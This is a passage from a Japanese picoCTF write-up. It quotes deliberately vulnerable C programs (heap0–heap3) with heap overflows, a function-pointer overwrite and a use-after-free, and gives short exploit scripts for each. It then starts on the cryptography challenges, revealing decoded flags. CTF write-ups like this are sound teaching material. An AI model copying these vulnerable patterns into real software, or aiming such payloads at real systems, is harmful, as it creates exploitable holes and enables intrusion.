</span><span style="color:#d4be98;">            break;
</span><span style="color:#d4be98;">        case 5:
</span><span style="color:#d4be98;">            // exit
</span><span style="color:#d4be98;">            return 0;
</span><span style="color:#d4be98;">        default:
</span><span style="color:#d4be98;">            printf(&quot;Invalid choice\n&quot;);
</span><span style="color:#d4be98;">            fflush(stdout);
</span><span style="color:#d4be98;">        &#125;
</span><span style="color:#d4be98;">    &#125;
</span><span style="color:#d4be98;">&#125;
</span></code></pre>
<p>heap領域に<code>safe_var</code>と<code>input_var</code>という変数を確保して<code>input_var</code>に値を書いたり読んだり、フラグの読み取りを試みたりできるプログラムになっている。</p>
<p><code>init</code>でmallocを使って<code>safe_var</code>と<code>input_var</code>を作り、それぞれ、<code>&quot;pico&quot;</code>と<code>&quot;bico&quot;</code>に初期化している。init関数終了時点でのheapは以下のようになっている。</p>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">0x5555555596a0                          0x0000000000000021      ........!.......
</span><span style="color:#d4be98;">0x5555555596b0  0x000000006f636970      0x0000000000000000      pico............
</span><span style="color:#d4be98;">0x5555555596c0  0x0000000000000000      0x0000000000000021      ........!.......
</span><span style="color:#d4be98;">0x5555555596d0  0x000000006f636962      0x0000000000000000      bico............
</span><span style="color:#d4be98;">0x5555555596e0  0x0000000000000000      0x0000000000020921      ........!.......
</span></code></pre>
<p><code>write_buffer</code>では入力のサイズを確認せず、そのまま<code>input_data</code>に書き込んでいる。
よって、ここにheap overflowの脆弱性がある。
フラグを得るには<code>safe_var</code>の値<code>&quot;bico&quot;</code>を他の適当な値に改変すれば良いので、exploitは以下のようになる。</p>
<pre style="background-color:#292828;"><code class="language-python"><span style="color:#d4be98;">#!/usr/bin/env python
</span><span style="color:#d4be98;">import pwn
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">def connect():
</span><span style="color:#d4be98;">    return pwn.process(&quot;./vuln&quot;)
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">io = connect()
</span><span style="color:#d4be98;">io.sendline(b&quot;2&quot;)
</span><span style="color:#d4be98;">io.sendline(b&quot;a&quot; * 33)
</span><span style="color:#d4be98;">io.sendline(b&quot;4&quot;)
</span><span style="color:#d4be98;">io.recvuntil(b&quot;YOU WIN\n&quot;)
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">print(io.recvline())
</span></code></pre>
<h2>heap1</h2>
<p>ソースコードが渡された。</p>
<pre style="background-color:#292828;"><code class="language-c"><span style="color:#d4be98;">#include &lt;stdio.h&gt;
</span><span style="color:#d4be98;">#include &lt;stdlib.h&gt;
</span><span style="color:#d4be98;">#include &lt;string.h&gt;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">#define FLAGSIZE_MAX 64
</span><span style="color:#d4be98;">// amount of memory allocated for input_data
</span><span style="color:#d4be98;">#define INPUT_DATA_SIZE 5
</span><span style="color:#d4be98;">// amount of memory allocated for safe_var
</span><span style="color:#d4be98;">#define SAFE_VAR_SIZE 5
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">int num_allocs;
</span><span style="color:#d4be98;">char *safe_var;
</span><span style="color:#d4be98;">char *input_data;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void check_win() &#123;
</span><span style="color:#d4be98;">    if (!strcmp(safe_var, &quot;pico&quot;)) &#123;
</span><span style="color:#d4be98;">        printf(&quot;\nYOU WIN\n&quot;);
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">        // Print flag
</span><span style="color:#d4be98;">        char buf[FLAGSIZE_MAX];
</span><span style="color:#d4be98;">        FILE *fd = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
</span><span style="color:#d4be98;">        fgets(buf, FLAGSIZE_MAX, fd);
</span><span style="color:#d4be98;">        printf(&quot;%s\n&quot;, buf);
</span><span style="color:#d4be98;">        fflush(stdout);
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">        exit(0);
</span><span style="color:#d4be98;">    &#125; else &#123;
</span><span style="color:#d4be98;">        printf(&quot;Looks like everything is still secure!\n&quot;);
</span><span style="color:#d4be98;">        printf(&quot;\nNo flage for you :(\n&quot;);
</span><span style="color:#d4be98;">        fflush(stdout);
</span><span style="color:#d4be98;">    &#125;
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void print_menu() &#123;
</span><span style="color:#d4be98;">    printf(&quot;\n1. Print Heap:\t\t(print the current state of the heap)&quot;
</span><span style="color:#d4be98;">           &quot;\n2. Write to buffer:\t(write to your own personal block of data &quot;
</span><span style="color:#d4be98;">           &quot;on the heap)&quot;
</span><span style="color:#d4be98;">           &quot;\n3. Print safe_var:\t(I&#39;ll even let you look at my variable on &quot;
</span><span style="color:#d4be98;">           &quot;the heap, &quot;
</span><span style="color:#d4be98;">           &quot;I&#39;m confident it can&#39;t be modified)&quot;
</span><span style="color:#d4be98;">           &quot;\n4. Print Flag:\t\t(Try to print the flag, good luck)&quot;
</span><span style="color:#d4be98;">           &quot;\n5. Exit\n\nEnter your choice: &quot;);
</span><span style="color:#d4be98;">    fflush(stdout);
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void init() &#123;
</span><span style="color:#d4be98;">    printf(&quot;\nWelcome to heap1!\n&quot;);
</span><span style="color:#d4be98;">    printf(
</span><span style="color:#d4be98;">        &quot;I put my data on the heap so it should be safe from any tampering.\n&quot;);
</span><span style="color:#d4be98;">    printf(&quot;Since my data isn&#39;t on the stack I&#39;ll even let you write whatever &quot;
</span><span style="color:#d4be98;">           &quot;info you want to the heap, I already took care of using malloc for &quot;
</span><span style="color:#d4be98;">           &quot;you.\n\n&quot;);
</span><span style="color:#d4be98;">    fflush(stdout);
</span><span style="color:#d4be98;">    input_data = malloc(INPUT_DATA_SIZE);
</span><span style="color:#d4be98;">    strncpy(input_data, &quot;pico&quot;, INPUT_DATA_SIZE);
</span><span style="color:#d4be98;">    safe_var = malloc(SAFE_VAR_SIZE);
</span><span style="color:#d4be98;">    strncpy(safe_var, &quot;bico&quot;, SAFE_VAR_SIZE);
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void write_buffer() &#123;
</span><span style="color:#d4be98;">    printf(&quot;Data for buffer: &quot;);
</span><span style="color:#d4be98;">    fflush(stdout);
</span><span style="color:#d4be98;">    scanf(&quot;%s&quot;, input_data);
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void print_heap() &#123;
</span><span style="color:#d4be98;">    printf(&quot;Heap State:\n&quot;);
</span><span style="color:#d4be98;">    printf(&quot;+-------------+----------------+\n&quot;);
</span><span style="color:#d4be98;">    printf(&quot;[*] Address   -&gt;   Heap Data   \n&quot;);
</span><span style="color:#d4be98;">    printf(&quot;+-------------+----------------+\n&quot;);
</span><span style="color:#d4be98;">    printf(&quot;[*]   %p  -&gt;   %s\n&quot;, input_data, input_data);
</span><span style="color:#d4be98;">    printf(&quot;+-------------+----------------+\n&quot;);
</span><span style="color:#d4be98;">    printf(&quot;[*]   %p  -&gt;   %s\n&quot;, safe_var, safe_var);
</span><span style="color:#d4be98;">    printf(&quot;+-------------+----------------+\n&quot;);
</span><span style="color:#d4be98;">    fflush(stdout);
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">int main(void) &#123;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    // Setup
</span><span style="color:#d4be98;">    init();
</span><span style="color:#d4be98;">    print_heap();
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    int choice;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    while (1) &#123;
</span><span style="color:#d4be98;">        print_menu();
</span><span style="color:#d4be98;">        if (scanf(&quot;%d&quot;, &amp;choice) != 1) exit(0);
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">        switch (choice) &#123;
</span><span style="color:#d4be98;">        case 1:
</span><span style="color:#d4be98;">            // print heap
</span><span style="color:#d4be98;">            print_heap();
</span><span style="color:#d4be98;">            break;
</span><span style="color:#d4be98;">        case 2:
</span><span style="color:#d4be98;">            write_buffer();
</span><span style="color:#d4be98;">            break;
</span><span style="color:#d4be98;">        case 3:
</span><span style="color:#d4be98;">            // print safe_var
</span><span style="color:#d4be98;">            printf(&quot;\n\nTake a look at my variable: safe_var = %s\n\n&quot;,
</span><span style="color:#d4be98;">                   safe_var);
</span><span style="color:#d4be98;">            fflush(stdout);
</span><span style="color:#d4be98;">            break;
</span><span style="color:#d4be98;">        case 4:
</span><span style="color:#d4be98;">            // Check for win condition
</span><span style="color:#d4be98;">            check_win();
</span><span style="color:#d4be98;">            break;
</span><span style="color:#d4be98;">        case 5:
</span><span style="color:#d4be98;">            // exit
</span><span style="color:#d4be98;">            return 0;
</span><span style="color:#d4be98;">        default:
</span><span style="color:#d4be98;">            printf(&quot;Invalid choice\n&quot;);
</span><span style="color:#d4be98;">            fflush(stdout);
</span><span style="color:#d4be98;">        &#125;
</span><span style="color:#d4be98;">    &#125;
</span><span style="color:#d4be98;">&#125;
</span></code></pre>
<p>heap0とほとんど同じだが、フラグを得るための条件が<code>safe_var</code>の値を<code>&quot;pico&quot;</code>に変更するというものに変わっている。よってexploitは以下のようになる。</p>
<pre style="background-color:#292828;"><code class="language-python"><span style="color:#d4be98;">#!/usr/bin/env python
</span><span style="color:#d4be98;">import pwn
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">def connect():
</span><span style="color:#d4be98;">    return pwn.process(&quot;./chall&quot;)
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">io = connect()
</span><span style="color:#d4be98;">io.sendline(b&quot;2&quot;)
</span><span style="color:#d4be98;">payload = b&quot;&quot;
</span><span style="color:#d4be98;">payload += b&quot;A&quot; * 32
</span><span style="color:#d4be98;">payload += b&quot;pico&quot;
</span><span style="color:#d4be98;">io.sendline(payload)
</span><span style="color:#d4be98;">io.sendline(b&quot;4&quot;)
</span><span style="color:#d4be98;">io.recvuntil(b&quot;YOU WIN\n&quot;)
</span><span style="color:#d4be98;">print(io.recvline())
</span></code></pre>
<h2>heap2</h2>
<p>ソースコードが渡された。</p>
<pre style="background-color:#292828;"><code class="language-c"><span style="color:#d4be98;">include &lt;stdio.h&gt;
</span><span style="color:#d4be98;">#include &lt;stdlib.h&gt;
</span><span style="color:#d4be98;">#include &lt;string.h&gt;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">#define FLAGSIZE_MAX 64
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">int num_allocs;
</span><span style="color:#d4be98;">char *x;
</span><span style="color:#d4be98;">char *input_data;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void win() &#123;
</span><span style="color:#d4be98;">    // Print flag
</span><span style="color:#d4be98;">    char buf[FLAGSIZE_MAX];
</span><span style="color:#d4be98;">    FILE *fd = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
</span><span style="color:#d4be98;">    fgets(buf, FLAGSIZE_MAX, fd);
</span><span style="color:#d4be98;">    printf(&quot;%s\n&quot;, buf);
</span><span style="color:#d4be98;">    fflush(stdout);
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    exit(0);
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void check_win() &#123; ((void (*)())*(int*)x)(); &#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void print_menu() &#123;
</span><span style="color:#d4be98;">    printf(&quot;\n1. Print Heap\n2. Write to buffer\n3. Print x\n4. Print Flag\n5. &quot;
</span><span style="color:#d4be98;">           &quot;Exit\n\nEnter your choice: &quot;);
</span><span style="color:#d4be98;">    fflush(stdout);
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void init() &#123;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    printf(&quot;\nI have a function, I sometimes like to call it, maybe you should change it\n&quot;);
</span><span style="color:#d4be98;">    fflush(stdout);
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    input_data = malloc(5);
</span><span style="color:#d4be98;">    strncpy(input_data, &quot;pico&quot;, 5);
</span><span style="color:#d4be98;">    x = malloc(5);
</span><span style="color:#d4be98;">    strncpy(x, &quot;bico&quot;, 5);
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void write_buffer() &#123;
</span><span style="color:#d4be98;">    printf(&quot;Data for buffer: &quot;);
</span><span style="color:#d4be98;">    fflush(stdout);
</span><span style="color:#d4be98;">    scanf(&quot;%s&quot;, input_data);
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void print_heap() &#123;
</span><span style="color:#d4be98;">    printf(&quot;[*]   Address   -&gt;   Value   \n&quot;);
</span><span style="color:#d4be98;">    printf(&quot;+-------------+-----------+\n&quot;);
</span><span style="color:#d4be98;">    printf(&quot;[*]   %p  -&gt;   %s\n&quot;, input_data, input_data);
</span><span style="color:#d4be98;">    printf(&quot;+-------------+-----------+\n&quot;);
</span><span style="color:#d4be98;">    printf(&quot;[*]   %p  -&gt;   %s\n&quot;, x, x);
</span><span style="color:#d4be98;">    fflush(stdout);
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">int main(void) &#123;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    // Setup
</span><span style="color:#d4be98;">    init();
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    int choice;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    while (1) &#123;
</span><span style="color:#d4be98;">        print_menu();
</span><span style="color:#d4be98;">        if (scanf(&quot;%d&quot;, &amp;choice) != 1) exit(0);
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">        switch (choice) &#123;
</span><span style="color:#d4be98;">        case 1:
</span><span style="color:#d4be98;">            // print heap
</span><span style="color:#d4be98;">            print_heap();
</span><span style="color:#d4be98;">            break;
</span><span style="color:#d4be98;">        case 2:
</span><span style="color:#d4be98;">            write_buffer();
</span><span style="color:#d4be98;">            break;
</span><span style="color:#d4be98;">        case 3:
</span><span style="color:#d4be98;">            // print x
</span><span style="color:#d4be98;">            printf(&quot;\n\nx = %s\n\n&quot;, x);
</span><span style="color:#d4be98;">            fflush(stdout);
</span><span style="color:#d4be98;">            break;
</span><span style="color:#d4be98;">        case 4:
</span><span style="color:#d4be98;">            // Check for win condition
</span><span style="color:#d4be98;">            check_win();
</span><span style="color:#d4be98;">            break;
</span><span style="color:#d4be98;">        case 5:
</span><span style="color:#d4be98;">            // exit
</span><span style="color:#d4be98;">            return 0;
</span><span style="color:#d4be98;">        default:
</span><span style="color:#d4be98;">            printf(&quot;Invalid choice\n&quot;);
</span><span style="color:#d4be98;">            fflush(stdout);
</span><span style="color:#d4be98;">        &#125;
</span><span style="color:#d4be98;">    &#125;
</span><span style="color:#d4be98;">&#125;
</span></code></pre>
<p>プログラムの構造はこれまでと同じ。しかし、今回は<code>check_win</code>で条件を満たしていたらフラグを出力するのではなく、<code>x</code>の値を関数として呼んでいる。
今回はフラグを出力する<code>win</code>という関数があるので、<code>x</code>の値を<code>win</code>のアドレスに変更できればフラグを獲得できる。</p>
<pre style="background-color:#292828;"><code class="language-python"><span style="color:#d4be98;">#!/usr/bin/env python
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">import ptrlib as ptr
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">io = ptr.Process(&quot;./chall&quot;)
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">win_addr = 0x00000000004011A0
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">io.recvuntil(b&quot;Enter your choice: &quot;)
</span><span style="color:#d4be98;">io.sendline(b&quot;2&quot;)
</span><span style="color:#d4be98;">io.sendline(b&quot;A&quot; * 32 + ptr.p64(win_addr))
</span><span style="color:#d4be98;">io.sendline(b&quot;4&quot;)
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">print(io.recvlineafter(b&quot;Enter your choice:&quot;))
</span></code></pre>
<h2>heap3</h2>
<p>ソースコードが渡された。</p>
<pre style="background-color:#292828;"><code class="language-c"><span style="color:#d4be98;">#include &lt;stdio.h&gt;
</span><span style="color:#d4be98;">#include &lt;stdlib.h&gt;
</span><span style="color:#d4be98;">#include &lt;string.h&gt;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">#define FLAGSIZE_MAX 64
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">// Create struct
</span><span style="color:#d4be98;">typedef struct &#123;
</span><span style="color:#d4be98;">  char a[10];
</span><span style="color:#d4be98;">  char b[10];
</span><span style="color:#d4be98;">  char c[10];
</span><span style="color:#d4be98;">  char flag[5];
</span><span style="color:#d4be98;">&#125; object;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">int num_allocs;
</span><span style="color:#d4be98;">object *x;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void check_win() &#123;
</span><span style="color:#d4be98;">  if(!strcmp(x-&gt;flag, &quot;pico&quot;)) &#123;
</span><span style="color:#d4be98;">    printf(&quot;YOU WIN!!11!!\n&quot;);
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    // Print flag
</span><span style="color:#d4be98;">    char buf[FLAGSIZE_MAX];
</span><span style="color:#d4be98;">    FILE *fd = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
</span><span style="color:#d4be98;">    fgets(buf, FLAGSIZE_MAX, fd);
</span><span style="color:#d4be98;">    printf(&quot;%s\n&quot;, buf);
</span><span style="color:#d4be98;">    fflush(stdout);
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    exit(0);
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">  &#125; else &#123;
</span><span style="color:#d4be98;">    printf(&quot;No flage for u :(\n&quot;);
</span><span style="color:#d4be98;">    fflush(stdout);
</span><span style="color:#d4be98;">  &#125;
</span><span style="color:#d4be98;">  // Call function in struct
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void print_menu() &#123;
</span><span style="color:#d4be98;">    printf(&quot;\n1. Print Heap\n2. Allocate object\n3. Print x-&gt;flag\n4. Check for win\n5. Free x\n6. &quot;
</span><span style="color:#d4be98;">           &quot;Exit\n\nEnter your choice: &quot;);
</span><span style="color:#d4be98;">    fflush(stdout);
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">// Create a struct
</span><span style="color:#d4be98;">void init() &#123;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    printf(&quot;\nfreed but still in use\nnow memory untracked\ndo you smell the bug?\n&quot;);
</span><span style="color:#d4be98;">    fflush(stdout);
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    x = malloc(sizeof(object));
</span><span style="color:#d4be98;">    strncpy(x-&gt;flag, &quot;bico&quot;, 5);
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void alloc_object() &#123;
</span><span style="color:#d4be98;">    printf(&quot;Size of object allocation: &quot;);
</span><span style="color:#d4be98;">    fflush(stdout);
</span><span style="color:#d4be98;">    int size = 0;
</span><span style="color:#d4be98;">    scanf(&quot;%d&quot;, &amp;size);
</span><span style="color:#d4be98;">    char* alloc = malloc(size);
</span><span style="color:#d4be98;">    printf(&quot;Data for flag: &quot;);
</span><span style="color:#d4be98;">    fflush(stdout);
</span><span style="color:#d4be98;">    scanf(&quot;%s&quot;, alloc);
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void free_memory() &#123;
</span><span style="color:#d4be98;">    free(x);
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">void print_heap() &#123;
</span><span style="color:#d4be98;">    printf(&quot;[*]   Address   -&gt;   Value   \n&quot;);
</span><span style="color:#d4be98;">    printf(&quot;+-------------+-----------+\n&quot;);
</span><span style="color:#d4be98;">    printf(&quot;[*]   %p  -&gt;   %s\n&quot;, x-&gt;flag, x-&gt;flag);
</span><span style="color:#d4be98;">    printf(&quot;+-------------+-----------+\n&quot;);
</span><span style="color:#d4be98;">    fflush(stdout);
</span><span style="color:#d4be98;">&#125;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">int main(void) &#123;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    // Setup
</span><span style="color:#d4be98;">    init();
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    int choice;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">    while (1) &#123;
</span><span style="color:#d4be98;">        print_menu();
</span><span style="color:#d4be98;">        if (scanf(&quot;%d&quot;, &amp;choice) != 1) exit(0);
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">        switch (choice) &#123;
</span><span style="color:#d4be98;">        case 1:
</span><span style="color:#d4be98;">            // print heap
</span><span style="color:#d4be98;">            print_heap();
</span><span style="color:#d4be98;">            break;
</span><span style="color:#d4be98;">        case 2:
</span><span style="color:#d4be98;">            alloc_object();
</span><span style="color:#d4be98;">            break;
</span><span style="color:#d4be98;">        case 3:
</span><span style="color:#d4be98;">            // print x
</span><span style="color:#d4be98;">            printf(&quot;\n\nx = %s\n\n&quot;, x-&gt;flag);
</span><span style="color:#d4be98;">            fflush(stdout);
</span><span style="color:#d4be98;">            break;
</span><span style="color:#d4be98;">        case 4:
</span><span style="color:#d4be98;">            // Check for win condition
</span><span style="color:#d4be98;">            check_win();
</span><span style="color:#d4be98;">            break;
</span><span style="color:#d4be98;">        case 5:
</span><span style="color:#d4be98;">            free_memory();
</span><span style="color:#d4be98;">            break;
</span><span style="color:#d4be98;">        case 6:
</span><span style="color:#d4be98;">            // exit
</span><span style="color:#d4be98;">            return 0;
</span><span style="color:#d4be98;">        default:
</span><span style="color:#d4be98;">            printf(&quot;Invalid choice\n&quot;);
</span><span style="color:#d4be98;">            fflush(stdout);
</span><span style="color:#d4be98;">        &#125;
</span><span style="color:#d4be98;">    &#125;
</span><span style="color:#d4be98;">&#125;
</span></code></pre>
<p>heap2までとほとんど同じ。<code>free_memory</code>で<code>x</code>を解放し、<code>alloc_object</code>で<code>x</code>と同じサイズで<code>malloc</code>して、そこの30番目に<code>&quot;pico&quot;</code>を書き込む。</p>
<pre style="background-color:#292828;"><code class="language-python"><span style="color:#d4be98;">#!/usr/bin/env python
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">import ptrlib as ptr
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">def connect():
</span><span style="color:#d4be98;">    p = ptr.Process(&quot;./chall&quot;)
</span><span style="color:#d4be98;">    # p = ptr.Socket(&quot;tethys.picoctf.net&quot;, 65386)
</span><span style="color:#d4be98;">    return p
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">io = connect()
</span><span style="color:#d4be98;">io.sendline(b&quot;5&quot;)
</span><span style="color:#d4be98;">io.sendline(b&quot;2&quot;)
</span><span style="color:#d4be98;">io.sendline(b&quot;35&quot;)
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">payload = b&quot;&quot;
</span><span style="color:#d4be98;">payload += b&quot;A&quot; * 30
</span><span style="color:#d4be98;">payload += b&quot;pico&quot;
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">io.sendline(payload)
</span><span style="color:#d4be98;">io.sendline(b&quot;4&quot;)
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">print(io.recvlineafter(&quot;YOU WIN!!11!!\n&quot;))
</span></code></pre>
<h1>Cryptography</h1>
<h2>interencdec</h2>
<p>以下の内容のファイルが渡された。</p>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">YidkM0JxZGtwQlRYdHFhR3g2YUhsZmF6TnFlVGwzWVROclgya3lNRFJvYTJvMmZRPT0nCg==
</span></code></pre>
<p>base64っぽいのでデコード。</p>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">d3BqdkpBTXtqaGx6aHlfazNqeTl3YTNrX2kyMDRoa2o2fQ==
</span></code></pre>
<p>これもbase64っぽいのでデコード</p>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">wpjvJAM&#123;jhlzhy_k3jy9wa3k_i204hkj6&#125;
</span></code></pre>
<p>シーザー暗号っぽいので解読</p>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">picoCTF&#123;caesar_d3cr9pt3d_b204adc6&#125;
</span></code></pre>
<h2>custom encryption</h2>
<p>暗号化プログラムのソースコードとフラグを暗号化したときの出力が渡された。</p>
<pre style="background-color:#292828;"><code class="language-python"><span style="color:#d4be98;">from random import randint
</span><span style="color:#d4be98;">import sys
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">def generator(g, x, p):
</span><span style="color:#d4be98;">    return pow(g, x) % p
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">def encrypt(plaintext, key):
</span><span style="color:#d4be98;">    cipher = []
</span><span style="color:#d4be98;">    for char in plaintext:
</span><span style="color:#d4be98;">        cipher.append(((ord(char) * key*311)))
</span><span style="color:#d4be98;">    return cipher
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">def is_prime(p):
</span><span style="color:#d4be98;">    v = 0
</span><span style="color:#d4be98;">    for i in range(2, p + 1):
</span><span style="color:#d4be98;">        if p % i == 0:
</span><span style="color:#d4be98;">            v = v + 1
</span><span style="color:#d4be98;">    if v &gt; 1:
</span><span style="color:#d4be98;">        return False
</span><span style="color:#d4be98;">    else:
</span><span style="color:#d4be98;">        return True
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">def dynamic_xor_encrypt(plaintext, text_key):
</span><span style="color:#d4be98;">    cipher_text = &quot;&quot;
</span><span style="color:#d4be98;">    key_length = len(text_key)
</span><span style="color:#d4be98;">    for i, char in enumerate(plaintext[::-1]):
</span><span style="color:#d4be98;">        key_char = text_key[i % key_length]
</span><span style="color:#d4be98;">        encrypted_char = chr(ord(char) ^ ord(key_char))
</span><span style="color:#d4be98;">        cipher_text += encrypted_char
</span><span style="color:#d4be98;">    return cipher_text
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">def test(plain_text, text_key):
</span><span style="color:#d4be98;">    p = 97
</span><span style="color:#d4be98;">    g = 31
</span><span style="color:#d4be98;">    if not is_prime(p) and not is_prime(g):
</span><span style="color:#d4be98;">        print(&quot;Enter prime numbers&quot;)
</span><span style="color:#d4be98;">        return
</span><span style="color:#d4be98;">    a = randint(p-10, p)
</span><span style="color:#d4be98;">    b = randint(g-10, g)
</span><span style="color:#d4be98;">    print(f&quot;a = &#123;a&#125;&quot;)
</span><span style="color:#d4be98;">    print(f&quot;b = &#123;b&#125;&quot;)
</span><span style="color:#d4be98;">    u = generator(g, a, p)
</span><span style="color:#d4be98;">    v = generator(g, b, p)
</span><span style="color:#d4be98;">    key = generator(v, a, p)
</span><span style="color:#d4be98;">    b_key = generator(u, b, p)
</span><span style="color:#d4be98;">    shared_key = None
</span><span style="color:#d4be98;">    if key == b_key:
</span><span style="color:#d4be98;">        shared_key = key
</span><span style="color:#d4be98;">    else:
</span><span style="color:#d4be98;">        print(&quot;Invalid key&quot;)
</span><span style="color:#d4be98;">        return
</span><span style="color:#d4be98;">    semi_cipher = dynamic_xor_encrypt(plain_text, text_key)
</span><span style="color:#d4be98;">    cipher = encrypt(semi_cipher, shared_key)
</span><span style="color:#d4be98;">    print(f&#39;cipher is: &#123;cipher&#125;&#39;)
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">if __name__ == &quot;__main__&quot;:
</span><span style="color:#d4be98;">    message = sys.argv[1]
</span><span style="color:#d4be98;">    test(message, &quot;trudeau&quot;)
</span></code></pre>
<pre style="background-color:#292828;"><code><span style="color:#d4be98;">a = 94
</span><span style="color:#d4be98;">b = 29
</span><span style="color:#d4be98;">cipher is: [260307, 491691, 491691, 2487378, 2516301, 0, 1966764, 1879995, 1995687, 1214766, 0, 2400609, 607383, 144615, 1966764, 0, 636306, 2487378, 28923, 1793226, 694152, 780921, 173538, 173538, 491691, 173538, 751998, 1475073, 925536, 1417227, 751998, 202461, 347076, 491691]
</span></code></pre>
<p>このプログラムには、基本的に不可逆的で値を復元するのに工夫が必要な演算が含まれていない。したがってそのまま逆の処理をするプログラムを書けば良い。</p>
<pre style="background-color:#292828;"><code class="language-python"><span style="color:#d4be98;">#!/usr/bin/env python
</span><span style="color:#d4be98;">from random import randint
</span><span style="color:#d4be98;">import sys
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">def generator(g, x, p):
</span><span style="color:#d4be98;">    return pow(g, x) % p
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">
</span><span style="color:#d4be98;">def is_prime(p):
</span><span style="color:#d4be98;">    v = 0
</span><span style="color:#d4be98;">    for i in range(2, p + 1):
</span><span style="color:#d4be98;">        if p % i == 0:
</span><span style="color:#d4be98;">            v = v + 1
</span><span style="color:#d4be98;">    if v &gt; 1:
</span><span style="color:#d4be98;">        return False
</span><span style="color:#d4be98;">    else:
</span><span style="color:#d4be98;">        return True
</span><span style="color:#d4be98;">
